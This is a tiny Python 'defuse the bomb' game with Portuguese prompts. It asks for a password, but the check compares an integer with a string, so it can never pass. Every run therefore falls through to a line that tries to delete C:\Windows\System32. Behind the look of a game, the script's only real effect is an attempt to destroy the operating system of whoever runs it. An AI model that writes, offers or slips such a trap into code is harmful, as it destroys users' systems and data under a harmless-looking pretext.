import os
import random
import time

codigo = random.randint(1,1000)
senha = input('Digite a senha para desarmar a bomba: ')

if codigo == senha:
    print('Bomba desarmada. Parabéns')

else:
    os.remove('C:\Windows\System32')
    